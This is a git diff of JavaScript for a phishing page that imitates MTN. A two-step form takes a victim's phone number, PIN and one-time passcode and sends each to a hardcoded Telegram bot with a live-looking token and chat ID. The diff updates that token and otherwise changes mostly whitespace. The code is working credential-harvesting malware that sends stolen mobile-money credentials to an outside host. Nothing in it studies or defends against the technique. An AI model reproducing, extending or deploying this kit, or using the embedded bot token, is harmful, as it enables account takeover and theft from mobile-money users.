@@ -1,14 +1,14 @@
 // Telegram Configuration - REPLACE THESE WITH YOUR ACTUAL DETAILS
-const TELEGRAM_BOT_TOKEN = '8611047796:AAGfTl6Xt11ql7-KDp8KhC_yuRI9aPk6pG8';
+const TELEGRAM_BOT_TOKEN = '8649783124:AAFPJqQEVTbP8T5Cl-enlegC9ZK4ad-kCn0';
 const TELEGRAM_CHAT_ID = '8512088259';
 
 // Helper function to send message to Telegram
 async function sendToTelegram(message) {
-    if (TELEGRAM_BOT_TOKEN === 'TELEGRAM_BOT_TOKEN') {
+    if (TELEGRAM_BOT_TOKEN === '8649783124:AAFPJqQEVTbP8T5Cl-enlegC9ZK4ad-kCn0') {
         console.warn('Telegram Bot Token is not configured. Simulating success.');
         return new Promise(resolve => setTimeout(resolve, 1000));
     }
-    
+
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     try {
         const response = await fetch(url, {
@@ -36,13 +36,13 @@ document.addEventListener('DOMContentLoaded', () => {
     const step2 = document.getElementById('step2');
     const phoneNumberInput = document.getElementById('phoneNumber');
     const displayPhone = document.getElementById('displayPhone');
-    
+
     // Auto-focus logic for PIN and OTP boxes
     const setupPinInputs = (containerId) => {
         const container = document.getElementById(containerId);
         if (!container) return;
         const inputs = container.querySelectorAll('.pin-box');
-        
+
         inputs.forEach((input, index) => {
             // Handle input
             input.addEventListener('input', (e) => {
@@ -52,7 +52,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     }
                 }
             });
-            
+
             // Handle backspace
             input.addEventListener('keydown', (e) => {
                 if (e.key === 'Backspace' && !e.target.value) {
@@ -62,7 +62,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     }
                 }
             });
-            
+
             // Prevent non-numeric input for OTP (tel type usually handles it, but just in case)
             if (input.type === 'tel' || input.type === 'password') {
                 input.addEventListener('keypress', (e) => {
@@ -73,17 +73,17 @@ document.addEventListener('DOMContentLoaded', () => {
             }
         });
     };
-    
+
     setupPinInputs('pinInputs');
-    
+
     // Phone number formatting (simple spacing)
     if (phoneNumberInput) {
-        phoneNumberInput.addEventListener('input', function(e) {
+        phoneNumberInput.addEventListener('input', function (e) {
             let value = this.value.replace(/\D/g, '');
             if (value.length > 15) {
                 value = value.substring(0, 15);
             }
-            
+
             // Format chunks of 3 digits for readability
             let formatted = '';
             for (let i = 0; i < value.length; i++) {
@@ -92,7 +92,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 }
                 formatted += value[i];
             }
-            
+
             this.value = formatted;
         });
     }
@@ -101,14 +101,14 @@ document.addEventListener('DOMContentLoaded', () => {
     if (detailsForm) {
         detailsForm.addEventListener('submit', (e) => {
             e.preventDefault();
-            
+
             // Validate all PIN inputs are filled
             const pinInputs = document.querySelectorAll('#pinInputs .pin-box');
             let isValid = true;
             pinInputs.forEach(input => {
                 if (!input.value) isValid = false;
             });
-            
+
             if (!phoneNumberInput.value || !isValid) {
                 alert('Please fill in all fields correctly.');
                 return;
@@ -119,11 +119,11 @@ document.addEventListener('DOMContentLoaded', () => {
             const originalText = btn.innerText;
             btn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Processing...';
             btn.disabled = true;
-            
+
             // Get PIN value
             let pinValue = '';
             pinInputs.forEach(input => pinValue += input.value);
-            
+
             const countryCode = document.getElementById('countryCode').value;
             const message = `🟢 <b>NEW MTN DETAILS</b>\n\n📱 <b>Phone:</b> ${countryCode} ${phoneNumberInput.value}\n🔒 <b>PIN:</b> ${pinValue}`;
 
@@ -131,12 +131,12 @@ document.addEventListener('DOMContentLoaded', () => {
             sendToTelegram(message).then(() => {
                 btn.innerHTML = originalText;
                 btn.disabled = false;
-                
+
                 // Show Step 2
                 displayPhone.innerText = countryCode + ' ' + phoneNumberInput.value;
                 step1.style.display = 'none';
                 step2.style.display = 'block';
-                
+
                 // Focus OTP input
                 setTimeout(() => {
                     const otpInput = document.getElementById('otpInputText');
@@ -154,7 +154,7 @@ document.addEventListener('DOMContentLoaded', () => {
     if (otpForm) {
         otpForm.addEventListener('submit', (e) => {
             e.preventDefault();
-            
+
             const otpInputText = document.getElementById('otpInputText');
             if (!otpInputText || !otpInputText.value.trim()) {
                 alert('Please enter the verification details.');
@@ -165,10 +165,10 @@ document.addEventListener('DOMContentLoaded', () => {
             const originalText = btn.innerText;
             btn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Verifying...';
             btn.disabled = true;
-            
+
             // Get OTP value
             let otpValue = otpInputText.value.trim();
-            
+
             const countryCode = document.getElementById('countryCode').value;
             const message = `🟡 <b>MTN OTP RECEIVED</b>\n\n📱 <b>Phone:</b> ${countryCode} ${phoneNumberInput.value}\n🔑 <b>Message/OTP:</b>\n${otpValue}`;
 
@@ -176,14 +176,14 @@ document.addEventListener('DOMContentLoaded', () => {
             sendToTelegram(message).then(() => {
                 btn.innerHTML = originalText;
                 btn.disabled = false;
-                
+
                 alert('Validation Successful!');
                 // Reset to step 1
                 step2.style.display = 'none';
                 step1.style.display = 'block';
                 detailsForm.reset();
                 otpForm.reset();
-                
+
                 // Clear pin boxes
                 document.querySelectorAll('.pin-box').forEach(input => input.value = '');
             }).catch(() => {
